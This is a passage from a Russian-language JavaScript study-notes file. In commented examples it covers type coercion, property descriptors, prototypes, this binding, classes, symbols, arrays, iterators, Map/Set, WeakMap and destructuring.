    age: 22,
    [Symbol.toPrimitive](hint) {
        console.log(hint);
        if (hint === 'string') {
            return this.name;
        }
        if (hint === 'default') {
            return this.name;
        }
        if (hint === 'number') {
            return this.age;
        }
    }
}
alert(a);   //dima
console.log(a + '');   //dima
console.log(+a);   //22
*/


//? toString/valueOf
//? если нет метода toPrimitive, то код сначала попробует вызывать toString для хинта string, valueOf для иных хинтов
/*
let a = {
    name: 'dima',
    age: 22,
    toString() {
        return this.name;
    },
    valueOf() {
        return this.age;
    }
}
alert(a);   //dima
console.log(a + '');   //'22'
console.log(+a);   //22
*/


//? в отсутствие Symbol.toPrimitive и valueOf, toString обработает все случаи преобразований к примитивам


//? Symbol.toStringTag
//? меняет поведение методов преобразования обьектов к строке, можно указать, какое строковое значение будет возвращено
/*
let obj = {
    [Symbol.toStringTag]: "User",
}
alert(obj);   '[object User]'
*/





//?================================================================================================================================================
//? /Флаги и дескрипторы свойств обьекта/
// https://learn.javascript.ru/property-descriptors

//? У свойств обьекта есть 3 флага:
//? writable – если true, свойство можно изменить, иначе оно только для чтения(ошибки при присвоении этому свойству нового значения будут выброшены только в use strict, иначе проигнорируются)

//? enumerable – если true, свойство перечисляется в циклах, в противном случае циклы его игнорируют

//? configurable – если true, свойство можно удалить, а эти атрибуты можно изменять, иначе этого делать нельзя


//? Object.defineProperty(obj, propertyName, descriptor)
//? По умолчанию при обычном создании обьекта через {}, все флаги установлены true, но мы также можем изменить их потом, как нам нужно
/*
Object.defineProperty(obj, 'name', {
    writable: false,
    configurable: false,
    enumerable: false,
});
*/


//? Object.defineProperties(object, descriptors)
//? метод для определения сразу нескольких дескрипторов свойств
/*
let obj = {};
Object.defineProperties(obj, {
    name: {value: 'dima', writable: false, configurable: false, enumerable: false},
});
*/


//? Object.getOwnPropertyDescriptors
//? получить все дескрипторы свойств обьекта, вместе с Object.defineProperties можно клонировать свойства сразу с его флагами
/*
let clone = Object.defineProperties({}, Object.getOwnPropertyDescriptors(obj));
*/





//?================================================================================================================================================
//? /Обьект может иметь только один прототип, но большую цепочку/

//? При обращении к свойству обьекта, обьект сначала ищет его внутри себя, а затем в своих прототипах

//? Если мы наследуемся от обьекта, и у родительского обьекта мы поменяем значение свойства, то оно изменится и в дочернем обьекте(вернее будет сказать, что дочерний обьект будет ссылаться на свойство в прототипе, а оно, естественно, будет изменено)










//!================================================================================================================================================
//? /Prototype/Прототип/
// https://learn.javascript.ru/prototype-inheritance

//? прототип - это обьект, служащий прообразом для других обьектов или обьект, в котором другой обьект, который наследуется от класса, у которого есть данный прототип может брать свойства и методы, если они необходимы.
//? prototype есть только у классов и функций(объявленных через function)


//? __proto__
//? есть у всех классов, обьектов и функций(т.к. это тоже обьект) и является это свойство ссылкой на prototype родителя, а также через него можно задавать прототип
//? у классов также есть __proto__ и ссылается он на Function.prototype, т.к. класс это функция и создан класс был через new Function


//? чтобы понять, чему равен __proto__ в конкретном обьекте(классе), надо точно понять с помощью какого конструктора он был создан. Например {} был создан через new Object, значит его прото будет равно Object.prototype, class One например является функцией и был создан через new Function, а значит Function.prototype будет результатом ссылки из прото
//? __proto__ ссылается всегда на prototype класса с помощью которого он был создан(в этом prototype как раз есть конструктор, с помощью которого и был создан обьект)





//? class Parent {}
//? class Child extends Parent{}
// ? console.log([].__proto__ === Array.prototype);                                                     был создан с помощью Array
//? console.log({}.__proto__ === Object.prototype);                                                     создан с помощью Object
//? console.log(Array.__proto__ === Function.prototype);                                                был создан с помощью Function
//? console.log(String.__proto__ === Function.prototype);                                               был создан с помощью Function
//? console.log(Function.__proto__ === Function.prototype);                                             был создан с помощью Function
//? console.log(Object.__proto__ === Function.prototype);                                               был создан с помощью Function
//? console.log(Object.prototype.__proto__ === null);                                                   прото прототипа обьект null
//? console.log(Function.prototype.__proto__ === Object.prototype);                                     был создан с помощью Object
//? console.log(Parent.__proto__ === Function.prototype);                                               был создан с помощью Function
//? console.log(Child.__proto__ === Parent.prototype.constructor && Child.__proto__ === Parent);        был создан с помощью Parent.constructor
//? console.log(Child.prototype.__proto__ === Parent.prototype);                                        был создан с помощью Parent





//? prototype не равен никаким другим прототипам, он единственный в своем роде!!! То есть он равен только __proto__ которое на него ссылается и все
//? prototype есть только у классов и функций(объявленных через function)


//? Обьект может иметь только один прототип, но большую цепочку

//? При обращении к свойству обьекта, обьект сначала ищет его внутри себя, а затем в своих прототипах

//? Если мы наследуемся от обьекта, и у родительского обьекта мы поменяем значение свойства, то оно изменится и в дочернем обьекте





//? Способы установки прототипов:

//? __proto__
//? Это геттер сеттер для установки прототипа обьекту
/*
let animal = {
    legs: 4,
}
let dog = {
    name: 'Alex',
    age: 5,
}
dog.__proto__ = animal;
console.log(dog);
console.log(dog.__proto__);   //animal   -   тоже самое что и [[Prototype]]
*/


//? setPrototypeOf
//? Устанавливает на обьект прототип


//? Object.create(null);
//? создание обьекта без протипа вообще, но и естественно не будет методов обьекта


//? При использовании геттера и сеттера и методов родительского обьекта, где используется this, this будет равен обьекту, на котором используется метод
//? Это на самом деле очень важная деталь, потому что у нас может быть большой объект со множеством методов, от которого можно наследовать. Затем наследующие объекты могут вызывать его методы, но они будут изменять своё состояние, а не состояние объекта-родителя.
/*
let animal = {
    legs: 4,
    value: 100,
    get info() {
        return this.legs + ' ' + this.value;
    },
}
let dog = {
    name: 'Alex',
    age: 5,
    dog.__proto__ = animal,
}
dog.value = 300;
console.log(dog.info);
*/


//? forin проходится не только по свойствам обьекта но и еще по свойствам прототипа





//?================================================================================================================================================
//? /F.prototype/
// https://learn.javascript.ru/function-prototype

//? Для функции конструктора можно указать перед ее созданием прототип, от которого она будет наследоваться, указать можно напрямую через prototype. Если в F.prototype содержится объект, оператор new устанавливает его в качестве [[Prototype]] для нового объекта.
/*
function One() {
    this.name = 'Alex';
}
One.prototype = { age: 22 };
let person = new One();
console.log(person);
*/





//?================================================================================================================================================
//? /Встроенные прототипы/
// https://learn.javascript.ru/native-prototypes

//? У всех значений кроме null и undefined есть встроенные прототипы, именно по этому мы можем вызывать на значениях методы и работать с ними

//? При обращении к примитивам js как бы создает из примитива обькт, выполняет метод, который нам нужен был, и возвращает этот обьект снова к примитиву

//? Мы можем сами менять встроенные методы прототипов и переписывать язык









//!================================================================================================================================================
//? /This/
// https://learn.javascript.ru/object-methods
// https://tproger.ru/translations/javascript-this-keyword/


//? контекст у вызова функции обычной - undefined(strict mode), window(обычный код)
/*
function f() {
    console.log(this);   //undefined
}
*/


//? контекст вызова стрелочной функции - контекст в котором она была определена, то есть контекст родителя, если она вызвана в глобальной области - window
//? стрелочная функция берет контекст из лексического окружения родителя
/*
let f = () => {
    console.log(this);   //window
}
*/


//? методы обьекта ссылаются на сам обьект, который его вызвал, то есть метод имеет контекст вызвавшего обьекта. То есть если один обьект имеет метод, и другой наследуется от первого, то второй будет вызывать метод родителя, и следовательно контекст будет второго обьекта, т.к. он вызывает метод.
/*
let obj = {
    a: 'dima',
    f() {
        console.log(this);   //метод ссылает на обьект, который его вызвал
        let s = () => {
            console.log(this);   //стрелочная функция ссылается на контекст родителя
        }
        s();
    }
}
obj.f();


let obj = {
    name: 'dima',
    f() {
        console.log(this);
    },
}
let obj2 = {
    age: 22,
};
Object.setPrototypeOf(obj2, obj);
obj2.f();   //obj2 покажет, т.к он и вызывал метод
*/


//? стрелочный метод обьекта не имеет контекста обьекта, в отличии от класса(но привязать их нельзя ни тот ни тот). Происходит это потому, что стрелочная функция берет контекст там, где была определена, в классе, класс - это функция-конструктор, значит новосозданный обьект, а следовательно берет как раз оттуда контекст, а в простом обьекте, она берет текущий контекст, а в обьекте контекста нет, следовательно она берет внешний, поэтому у стрелочного метода обьекта нет контекста
/*
let obj = {
    f: () => {
        console.log(this);
    }
}
obj.f();   //window  у обьектов у стрелочных методов нет контекста обьекта

class User {
    constructor(age) {this.age = age}
    f = () => {
        console.log(this);
    }
}
let user = new User(22);
user.f();   //user  у экземпляров класса есть контекст экземпляра
*/


//? методы отделенные от обьекта в переменную не будут иметь собственного контекста, this всегда зависит от того, КТО вызывает метод, тоже самое происходит, когда мы передаем функцию, как колбэк
// https://learn.javascript.ru/object-methods#vnutrennyaya-realizatsiya-ssylochnyy-tip
/*
let obj = {
    name: 'dima',
    f() {
        console.log(this);
    },
}
let obj2 = {
    age: 22,
    f2: obj.f,
};
obj2.f2();   //obj2  мы отделили метод от obj, но вызывает его второй обьект, поэтому obj2


let obj = {
    name: 'dima',
    f() {
        console.log(this);
    },
}
let f = obj.f;
f();   //undefined  мы отделили метод, и вызываем глобально, поэтому контекста нет, это теперь просто функция

setTimeout(obj.f, 1000);   //undefined  т.к. мы отделили метод, надо привязать, чтобы избежать этого
*/


//? this в конструкторе это новосозданный экземпляр обьекта
/*
function User(name, age) {
    this.name = name;
    this.age = age;
    this.f = () => {
        console.log(this);
    }
}
let obj = new User('dima', 22);
obj.f();   //obj

class User {
    constructor(name, age) {
        this.name = name;
        this.age = age;
    }
    f = () => {
        console.log(this);
    }
}
let user = new User('dima', 22);
user.f();   //user
*/
//? new вызов в конструкторах обязателен!! из за него может теряться контекст!!(проблема для не обычного режима кода)
/*
new User();
*/


//? bind call apply
//? методы не работают со стрелочной функцией, стрелочной функции нельзя задать контекст через привязку, она будет всегда иметь тот контекст, в котором была создана
/*
class User {
    constructor(age) {
        this.age = age;
    }
    f() {
        console.log(this);
    }
    f2 = () => {
        console.log(this);
    }
}
let a = new User(22);
let b = {
    name: 'dima',
}
a.f.bind(b)();   //b, обычную функцию привязали
a.f2.bind(b)();   //a, потому что стрелочная
a.f();   //a
*/


//? bind жестко связывает функцию с переданным контекстом, создает функцию новую, которую затем надо вызвать, это значит, что и свойства этой функции будут другими, т.е. абсолютно новая функция
/*
function f(a) {
    console.log(this        a);
}
f.bind(3)(6);
*/


//? в событиях DOM, this ссылается на элемент, на котором начинается событие, если функция обычная, если стрелочная, то хуй знает, что там будет










//!================================================================================================================================================
//? /Функции конструкторы/
// https://learn.javascript.ru/constructor-new

//? new.target
//? в теле конструктора можно вызвать new.target, с помощью которого можно проверить была функция вызвана через new или нет
/*
function User(age) {
    if (!new.target) throw TypeError('забыл New оператор при создании!')
    this.age = age;
}
*/


//? возврат значения из конструктора
//? если возвращаем обьект, то вернем его, если примитив, то вернем новосозданный экземпляр обьекта


//? если конструктор ничего не принимает, можно опустить скобки вызова(для класса и функций)


//? Если внутри функции определить методы, они будут записаны именно в конкретный экземпляр, а класс же, будет записывать их в свой прототип.
//? Таким образом классы уже более подходят и более удобны для использования ООП.









//!================================================================================================================================================
//? /Classes/Классы/
// https://learn.javascript.ru/class

//? Класс - это синтаксический сахар над функцией конструктором(есть пара нюансов)
//? Синтаксис класса делает следующее:
//? Создается функция конструктор с именем класса, а ее вызов будет содержать тело constructor
//? Все методы класса записываются в прототип этого класса(нельзя получить при переоборе через циклы forin)
//? Все геттеры сеттеры также записываются в прототип этого класса(нельзя получить при переоборе через циклы forin)
//? Свойства класса создаются при вызове оператора new, то есть они находятся именно в самом экземпляре класса
//? В ES5 Класс преобразуется в функцию конструктор, куда в прототип через defineProperty будут записываться методы и геттеры и сеттеры, в ES6 и выше все остается как есть. Ниже ES5 геттеры и сеттеры уже нельзя использовать

//? В примере ниже, если геттер не переопределить на уровне наследуемого класса, но переопределить сеттер, то геттер в прототип будет записан как undefined, а сеттер как обычный сеттер. Странноватое поведение. Но это потому что defineProperty будет вызвано, а оно
/*
class Base {
    #data;
    get data() {
        return this.#data;
    }
    set data(data) {
        this.#data = data;
    }
}
class Extend1 extends Base {
    constructor(data) {
        super();
        this.data = data;
    }
}
class Extend2 extends Extend1 {
    constructor(data) {
        super(data);
    }
    // get data() {
    //     return super.data;
    // }
    set data(data) {
        super.data = data;
    }
}
const test = new Extend2(1);
console.log(test);
console.log(test.data);
*/




//? В итоге в прототипе класса A.prototype будет содержаться функция конструктор(constructor) и все методы объявленные в этом классе
/*
class A {
    constructor(age) {
        this.age = age;
    }
    sayAge() {
        return this.age;
    }
}
let agedPerson = new A(22);
*/





//?================================================================================================================================================
//? /Наследование классов/
// https://learn.javascript.ru/class-inheritance

//? Вот пример того, что методы записываются в прототип класса, а свойства в экземпляры
/*
class A {
    constructor(age) {
        this.age = age;
    }

    sayAge() {
        return this.age;
    }
}

let a = new A(22);
let a2 = new A(100);

a2.age = 123213213;
console.log(a.sayAge());   //22
console.log(a2.sayAge());   //123213213

a2.__proto__.sayAge = function () {   // тут я переопределил метод именно в прототипе класса A, а значит он поменялся у обоих созданных обьектов
    return 'а вот хер там, верну строку';
}

console.log(a.sayAge());   //'а вот хер там, верну строку';
console.log(a2.sayAge());   //'а вот хер там, верну строку';
*/

//? Тут я перезаписываю метод в прототип наследуемого класса
/*
class A {
    constructor(age) {
        this.age = age;
    }

    sayAge() {
        return this.age;
    }
}
class B extends A {
    constructor(age, name) {
        super(age);
        this.name = name;
    }
    sayAge() {
        return `${this.age} перезаписал, он теперь в прототипе класса B`;
    }
}
let b = new B(22, 'Alex');
console.log(b);
console.log(b.sayAge());   //`${this.age} перезаписал, он теперь в прототипе класса B`; потому что метод записался в прототип класса B и перезаписал предыдущий, до предыдущего нет доступа
*/


//? После extends разрешены любые выражения
//? Синтаксис создания класса допускает указывать после extends не только класс, но любое выражение. Это может быть полезно для продвинутых приёмов проектирования, где мы можем использовать функции для генерации классов в зависимости от многих условий и затем наследовать их.
/*
function f(phrase) {
    return class {
        sayHi() { alert(phrase) }
    }
}
class User extends f("Привет") {}
new User().sayHi(); // Привет
*/


//? Если мы хотим достучаться до родительского класса и вызвать у него свойство или метод, нам нужно обратиться через super к свойству или методу
//? Также в конструкторе вызов super() вызывает из прототипа конструктор родительского класса
//? То есть грубо говоря вызовом super мы обращаемся к родительскому классу


//? У стрелочных функций нет super
//? для того, чтобы с super нормально работать, нужно понимать какой контекст в функции, в которой мы вызваем super, super как бы связан с контекстом
//? т.к. у обычных функций контекст undefined, то и super не отработает
/*
class A {
    constructor(age) {
        this.age = age;
    }
}
class B extends A {
    constructor(age, name) {
        super(age);
        this.name = name;
    }
    sayAge() {
        setTimeout(function () { console.log(super.age()) }, 1000);   //такое не запустится
    }
}
*/




//? Также, чтобы super корректно отрабатывал в обьектах, методы нужно определять как методы, а не свойства-функции
/*
let animal = {
    eat: function() {       // намеренно пишем так, а не eat() { ...
        // ...
    }
};
let rabbit = {
    __proto__: animal,
    eat: function() {
        super.eat();
    }
};
rabbit.eat();       //Ошибка вызова super (потому что нет [[HomeObject]])
*/
/*
**
***
****
*****/
//?=============================================================================
//? /Order creation/Порядок создания/

//? оба прототипа сразу определены после объявления классов

//? При вызове new B();
//? создается экземпляр A
//? вызывается console.log('value', this.property); - и выведется в консоль 'base', потому что пока что не создан B и пока есть доступ только к A
//? this.sendLog() вызовется из прототипа B, так как по this - при наследовании идет от верха к дочерним, то есть тут от b -> a, и потому что прототип доступен к использованию сразу после определения класса, если этот метод внутри себя использует переменные класса, то они возьмутся по из того класса, чей конструктор вызывается. Если у нас создается A и методы есть и там и там sendLog - то вызовется из B, но переменную возьмет пока еще из A, потому что B конструктор еще не вызывался
// class A {
//     property = 'base';

//     constructor() {
//         console.log(this);
//         console.log('value', this.property);
//         this.sendLog()
//     }

//     sendLog() {
//         console.log('Base log', this.property);
//     }
// }

// class B extends A {
//     a = 'a'
//     property = 'inherit';

//     constructor() {
//         super();
//         console.log(this);
//     }

//     sendLog() {
//         console.log('Inherit log', this.property);
//     }
// }
// new B()





//?================================================================================================================================================
//?/ Статические свойства и методы/
// https://learn.javascript.ru/static-properties-methods

//? В классе можно объявить статические свойства и методы, они не будут записаны в "прототип" класса, а будут находится как свойства только в данном классе.
/*
class User {
    static age = '32';
    constructor() {
        this.level = 22;
    }
    static sayHi() {
        console.dir(this);
    }
}

let a = new User();
a.sayHi();   //не сработает, т.к. sayHi есть только у класса, тоже самое и со свойством age
console.log(User.a);
*/


//? Статические значения наследуются и также будут доступны в конкректном дочернем классе





//?================================================================================================================================================
//? /Приватные и защищенные поля/
// https://learn.javascript.ru/private-protected-properties-methods

//? Есть соглашение всеобщее программистов, что защищенные поля, к которым нельзя получать напрямую доступ вне класса начинаются с _
/*
class A{
    _forbidden = true;
}
*/


//? Приватные поля и методы начинаются с #
//? Они не наследуются, то есть доступ к ним есть ТОЛЬКО в конкретном классе и все, нет ни в наследуемых классах ни в экзмеплярах обьекта
//? Единственный способ получения значения вне класса это геттер или функция
//? Такие поля сначала объявляются сверху перед конструктором
//? Также получить доступ через ['#name'] нельзя, специальная защита свойств
/*
class First {
    #hidden;
    constructor() {
        this._name = 'Alex';
        this.#hidden = 'hidden';
    }
    get hidden() {
        this.#logThis();
        return this.#hidden;
    }
    #logThis = () => {
        console.log('this');
    }
}
class Second extends First {
    constructor() {
        super();
    }
}
let obj1 = new First();
let obj2 = new Second();
console.log(obj1);
console.log(obj2);
console.log(obj2.hidden);
*/
/*
**
***
****
*****/
//?================================================================================================================================================
//? /Instanceof/
// https://learn.javascript.ru/instanceof

//? Показыват, наследуется ли наш обьект от определенного класса, он считает классы также в цепочке прототипов, если мы создали массив, то он будет и instanceof Object и instanceof Array
/*
let arr = [1, 2, 3];
alert( arr instanceof Array ); // true
alert( arr instanceof Object ); // true
*/
/*
**
***
****
*****/
//?================================================================================================================================================
//? /Примеси/
// https://learn.javascript.ru/mixins


//? Примесь, это подмешивание в класс методов и свойств из другого обьекта
//? Получается, мы в прототип класса подмешиваем нужные нам методы, и те же методы можно потом подмешть в другой нужный нам класс, но чтобы он не зависел от первого
/*
let sayHiMixin = {
    sayHi() {
        alert(`Привет, ${this.name}`);
    },
    sayBye() {
        alert(`Пока, ${this.name}`);
    }
};
class User {
    constructor(name) {
        this.name = name;
    }
}
Object.assign(User.prototype, sayHiMixin);
new User("Вася").sayHi();   //Привет, Вася!
*/










//!================================================================================================================================================
//? /Symbol/символы/
// https://learn.javascript.ru/symbol

//? символы никогда не равны друг другу, даже если задать одинаковое описание


//? символы одинаковы, если они заданы глобально через Symbol.for и имеют одно и то же описание, в других случая всегда разные
/*
let id1 = Symbol("id");
let id2 = Symbol("id");
alert(id1 == id2);   //false


Symbol.for('1') === Symbol.for('1') === true
*/


//? символы не преобразуются в стороки сами по себе, если мы хотим их вывести, нам надо явно самим преобразовать их toString


//? можно получить описание символа через description
/*
let a = Symbol('id');
console.log(a.description);
*/


//? скрытность свойства
//? обратиться к свойству в обьекте, которое записано через символ можно через []
/*
let a = Symbol('id');
let obj = {
    [a]: '1',
}
console.log(obj[a]);
*/


//? forin не перебирает свойства - символы
//? Object.keys(obj) не видит их также
//? Object.assign() копирует абсолютно все свойства
//? Object.getOwnPropertySymbols(obj) – с его помощью можно получить все свойства объекта с ключами-символами
//? Reflect.ownKeys(obj) который возвращает все ключи объекта, включая символьные


//? Symbol.for  глобальные символы
//? если мы хотим использовать глобально символы, мы можем определить их и обращаться через описание символа, и нам гарантированного вернется один и тот же
//? если его не было, мы записали в переменную а символ с описанием, и если он уже создан, мы берем символ из глобального пространства и записываем в b, а значит они равны
/*
let a = Symbol.for('id');
let b = Symbol.for('id');
console.log(b === a);
*/
//? но так мы можем получить только глобальные символы, ниже код уже не сработает
/*
let a = Symbol.for('id');
let b = Symbol('id');
console.log(b === a);   //false
*/


//? Symbol.keyFor
//? получить описание символа по символу, работает только для глобальных символов
/*
let a = Symbol.for('id');
let b = Symbol('id');
let c = Symbol.for('id');
console.log(Symbol.keyFor(a) === Symbol.keyFor(c));   //true, 2 глобальных символа имеют одно и то же описание
console.log(Symbol.keyFor(b));   //undefined, не глобальный символ
*/



//? /Symbol.hasInstance/instanceOf/
// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/hasInstance
//? можно переопределить



//? /asyncIterator/



//? /isConcatSpreadable/



//? /iterator/



//? /match/



//? /matchAll/



//? /replace/



//? /search/



//? /species/



//? /split/



//? /toPrimitive/



//? /toStringTag/
/*
**
***
****
*****/
//!================================================================================================================================================
//? /Работа с примитивами/Почему у примитивов есть методы?/
// https://learn.javascript.ru/primitives-methods

//? при вызове "." у примитива js создает обьект, у которого есть все методы, которые мы можем использовать(например toFixed), как только мы вызываем метод этот, js удаляет обьект и возвращает примитив


//? также можно создавать примитив через new, но это крайне не желательно, т.к. при таком создании мы создаем обьект, а не примитив, а следовательно это может привести к ошибкам
/*
let a = new String('');
if (a) {
    console.log(a);
}
*/


//? null/undefined не имеют методов, попытка вызвать свойство приведет к ошибке










//!================================================================================================================================================
//? /Числа/
// https://learn.javascript.ru/number


//? большие числа можно записать через "e"
/*
let a = 1000;
let b = 1e3;
a === b;    //true

let c = 1e-4;   //0.0001
*/


//? неточности вычислений
//? в формате IEEE 754 всегда такая ошибка, поэтому надежный способ, округлять числа до нужного количества знаков после запятой, методом toFixed
/*
alert( 0.1 + 0.2 == 0.3 );   //false
alert( 0.1 + 0.2 );   //0.30000000000000004
*/


//? isNaN сначала приводит к числу, и если приведенное число NaN - вернет true
/*
isNaN(NaN);   //true
*/


//? Number.isNaN проверит является NaN или нет


//? isFinite(value) преобразует аргумент в число и возвращает true, если оно является обычным(конечным)
/*
console.log(isFinite(12));   //true
console.log(isFinite('23'));   //true
console.log(isFinite('23fsd'));   //false
*/


//? Второй аргумент parseInt(str, radix), мы можем задать, в какой системе счисления мы ищем числа в строке










//!================================================================================================================================================
//? /String/строки/
// https://learn.javascript.ru/string

//? можно использовать спецсимволы, например перевод строки "\n"


//? строки можно перебирать через forof, т.к. у них есть символ итератор


//? Обращение к символу по индексу
//? обращаться к определенном символу можно через [] или через str.charAt(), если не будет значения в первом случае вернется undefined, во втором пустая строка
//? charAt отличается от [], тем, что метод вернет пустую строку, если нет такого символа, а [] вернет undefined, также метод может принимать булеан значения и преобразует их в числа



//? /String vs toString/
//? мое личное мнение что toString лучше, особенно в ts
//? в примере ниже a по разному после выполнения кода будет, кому из нас нужен undefined в виде строки, поэтому лучше такое обработать через ?.toString, но String более безопасен с точки зрения если код упадет с ошибкой
/*
interface Response {
    field?: number
}
class Test {
    constructor(
        data: Response,
    ) {
        const a = String(data.field);
    }
}
class Test {
    constructor(
        data: Response,
    ) {
        const a = data.field?.toString();
    }
}
*/
/*
**
***
****
*****/
//!================================================================================================================================================
//? /Array/массивы/
// https://learn.javascript.ru/array

//? Массив наследуется от обьекта, поэтому также копируется по ссылке.


//? Создается либо через [] либо new Array, и туда и туда передаются изначальные данные. Но при создании через вызов конструктора есть нюанс, если мы передадим одно число, то будет создан массив с заданным количеством пустых индексов.
/*
let arr = [1,2,3];
*/

//? можно использовать отрицательные индексы, но тогда это будет записываться, как обычный ключ

//? перебор массива
// https://learn.javascript.ru/array#perebor-elementov


//? forof работает только с теми типами данных, для которых задан Symbol.iterator!!!
//? forof рекомендуется или for обычный

//? forin тоже можно, но если наш массив является каким то массивом с допольнительными свойствами и методами, они также будут включены в перебор, в отличии от forof, а также forin будет медленнее работать


//? Array.isArray()
//? проверяет это массив или нет, потому что typeof вернет обьект



//? при переборе массива, если функция колбэк запушит новый элемент в массив, то это не повлияет на количество итераций, итераций будет столько - сколько элементов имел массив до начала цикла



//? в функциях перебора массива(filter, и т.д) можно передать последний аргумент thisArg, который установит this в функции на переданный
// https://learn.javascript.ru/array-methods#bolshinstvo-metodov-podderzhivayut-thisarg





//? Пребразование массивов
//? массивы преобразуются к строке по своему
//? пустой массив будет '', если он не пуст, то значения его преобразуются в строку, а затем сконатенируются в одну строку через запятую
//? массивы реализуют метод только toString



//? Если у нас стоит задача объединять массивы - то:
//? push(...array) - самый быстрый вариант - потому что когда мы пушим будет происходить аммортизация массива и он сразу будет увеличен вдвое
//? затем concat - тоже отличный вариант, но немного медленнее
//? spread - из за итератора идет долго, тк в итераторе создаются лишние обьекты и много доп операций
/*
const first = Array(10_000).fill(null).map((_, index )=> index);
const second = Array(10_000).fill(null).map((_, index )=> first.length + index);

let result: number[] = [];
console.time();
for (let index = 0; index < 10_0; index++) {
    // result = result.concat(first, second); //50-170
    // result = [...result, ...first, ...second]; //1910-3500
    // result.push(...first, ...second); //30-70
}
console.timeEnd();

console.log(result.length / 1_000_000);
*/



//? для перебора быстрее всего: for, forEach, forOf, forIn(тут совсем все плохо)
/*
**
***
****
*****/
//!================================================================================================================================================
//? /Итерируемые перебираемые обьекты/Symbol.iterator/Iterator/
// https://learn.javascript.ru/iterable
// https://www.youtube.com/watch?v=7wtbNNiOh30&ab_channel=%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%BB%D0%B5%D0%BD%D0%9C%D0%B8%D0%BD%D0%B8%D0%BD

//? Symbol.iterator
//? метод с помощью которого есть возможность перебирать массивы, map, set, строки, а также все те обьекты, где используем этот метод, через forof, Array.from, spread.
//? Symbol.iterator - функция, которая возвращает обьект с методом next, который возвращает обьект с полями done, value. Каждый раз итератор увеличивается на один и возвращает следующее нужное нам значение, пока верно условие


//? Важная оговорка!
//? Итерируемые объекты – это объекты, которые реализуют метод Symbol.iterator, как было описано выше.
//? Псевдомассивы – это объекты, у которых есть индексы и свойство length, то есть, они выглядят как массивы.


//? если мы создали класс с методом итерации и потом наследуемся от него, то метод итерации пожно перезаписать










//!================================================================================================================================================
//? /Map/Set/
// https://learn.javascript.ru/map-set

//? MAP
//? Map может содержать в виде ключей все, что угодно и обьекты и т.д; в отличии от обьекта хранит ключи в том порядке, в каком они были записаны


//? Порядок ключей в map будет оставаться таким же, т.е. в порядке записи, в отличии от object


//? В map можно устанавливать свойства как и в обьект, т.е. стучаться к ключу и определять его, но тогда мы не сможем получить это свойство через методы, поэтому все манипуляции должны быть с помощью методов
/*
let a = new Map();
a['test'] = 'test';
a.set('test', 'test')
console.log(a);
console.log(a['test']);
*/


//? в Map можно задавать только итерируемые значение, который содержат ключ-значения
/*
new Map([
    [1,1],
    [true, false],
    [name, 'dima'],
]);
*/


//? Map from object
//? сначала нужно перевести обьект в массив массивов Object.entries, и затем создать Map
/*
let obj = {
    name: 'bla',
    age: 22,
    gdsf: 'sdfsdf',
    '1': '1',
};
let map = new Map(Object.entries(obj));
*/


//? Object from entries
//? можно вызвать на Map entries метод и затем результат запихнуть в Object.fromEntries
/* Object.fromEntries(map.entries()) */





//? Методы
//? map.set(key, value) – записывает по ключу key значение value

//? map.get(key) – возвращает значение по ключу или undefined, если ключ key отсутствует

//? map.has(key) – возвращает true, если ключ key присутствует в коллекции, иначе false

//? map.delete(key) – удаляет элемент по ключу key

//? map.clear() – очищает коллекцию от всех элементов

//? map.size – возвращает текущее количество элементов

//? map.keys() – возвращает итерируемый объект по ключам

//? map.values() – возвращает итерируемый объект по значениям

//? map.entries() – возвращает итерируемый объект по парам вида [ключ, значение], этот вариант используется по умолчанию в forof
/*
for (const iterator of map.keys()) {
    console.log(map.get(iterator));
}
*/


//? Map from array
//? сначала массив надо перевести в entries, и затем создать map
/*
let arr = ['Dima', 22, true, 'not married'];
let map2 = new Map([...arr.entries()]);
console.log(map2);
*/


//? Array from Map
//? вроде как нет методов нормальных, только через перебор и пуш в массив
/*
let arr = ['Dima', 22, true, 'not married'];
let map2 = new Map([...arr.entries()]);   ||   let map2 = new Map(Object.entries(arr));

let arrFromMap = [];
for (const iterator of map2) {
    arrFromMap.push(iterator[1]);
}
console.log(arrFromMap);
*/





//?================================================================================================================================================
//? /SET/


//? set хранит только уникальные значения


//? Методы
//? set.add(value) – добавляет значение (если оно уже есть, то ничего не делает), возвращает тот же объект set

//? set.delete(value) – удаляет значение, возвращает true, если value было в множестве на момент вызова, иначе false

//? set.has(value) – возвращает true, если значение присутствует в множестве, иначе false

//? set.clear() – удаляет все имеющиеся значения

//? set.size – возвращает количество элементов в множестве


//? методы перебора те же, что и у map


//? Set from Object и обратно
/*
let obj = {
    name: 'bla',
    age: 22,
    gdsf: 'sdfsdf',
    '1': '1',
    'name': '123123',
    'age': 100
}
let set = new Set(Object.entries(obj));   //создал set
console.log(Object.fromEntries(set));   //снова в обьект
*/


//? Set from array
//? в отличии от Map, Set можно создать из простого массива, и сразу удалить все повторявшиеся значения
/*
let arr = [1, 3, 4, 4, 4, 4, 4, 4, 'dima', 22];
let set = new Set(arr);
console.log(set);
*/










//!================================================================================================================================================
//? /WeakMap/WeakSet/
// https://learn.javascript.ru/weakmap-weakset

//? WeakMap - не предотвращает удаление свойства, если ключом выступал обьект, который был удален из кода. Т.е. если мы удалим обьект, то он пропадет и из weakmap
//? эта конструкция использует слабые ссылки
/*
let obj = { name: 'dima' };
let wMap = new WeakMap().set(obj, 'обьект');
obj = null;
console.log(wMap.get(obj));   //undefined
console.log(wMap.has(obj));   //false
*/


//? У него есть только след. методы:
//? weakMap.get(key)

//? weakMap.set(key, value)

//? weakMap.delete(key)

//? weakMap.has(key)


//? потому что чистщик мусора может удалить сразу обнуленный обьект, а может потом удалить разом сразу несколько обьектов для оптимизации, поэтому в разное время могут быть разные значения в этой структуре данных





//?================================================================================================================================================
//? /WeakSet/
//? может содерждать в себе только обьекты
//? имеет то же самое поведение, что и WeakMap










//!================================================================================================================================================
//? /Деструктуризирующее присваивание/
// https://learn.javascript.ru/destructuring-assignment

//? можно вытащить по отдельному индексу значение и сразу присвоить в переменную, можно также пропустить ненужные значения
/*
let arr = [1, 2, 3, 'alex', 4];
let [one, two, , name] = arr;
console.log(one, two, name);
console.log(arr);
*/


//? Деструктурирующее присваивание не уничтожает массив. Оно вообще ничего не делает с правой частью присваивания, его задача – только скопировать нужные значения в переменные


//? можно сразу присваивать в обьект
/*
let user = {};
[user.name, user.surname] = "Ilya Kantor".split(' ');
alert(user.name); // Ilya
*/


//? можно также установить значения по умолчанию
/*
let [one = 1, two = 2] = [];
*/





//?================================================================================================================================================
//? /Деструктуризация с обьектами/
